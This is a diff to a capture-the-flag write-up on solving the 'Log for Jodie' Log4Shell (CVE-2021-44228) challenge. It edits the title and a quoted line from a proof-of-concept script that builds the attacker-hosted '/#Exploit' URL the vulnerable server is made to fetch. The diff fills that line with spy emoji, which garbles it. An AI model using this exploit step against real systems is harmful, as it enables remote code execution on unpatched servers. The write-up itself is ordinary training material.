@@ -1,4 +1,4 @@
-# Log for Jodie (Log4Shell CVE)
+# Log for Jodie (Log4Shell CVE CVE-2021-44228)
 
 Hi there!
 Here is how I've solved the "Log for Jodie" challenge in LNC CTF 2022.
@@ -99,7 +99,7 @@ The localhost servers are already ported, but as you can see, the chat applicati
 Upon inspection of `poc.py`, we see that this line is responsible:
 
  
- ​  `  ​url​ ​=​ ​"http://{}:{}/#Exploit"​.​format​(​userip​, ​lport​)`  
+ 🕵  `  🕵url🕵 🕵=🕵 🕵"http://{}:{}/#Exploit"🕵.🕵format🕵(🕵userip🕵, 🕵lport🕵)`  
 So we can change that to our Web server url (the one running 8000 on local host.)
  
     ` url ="http://{}/#Exploit".format("<WEB SERVER URL HERE>")`
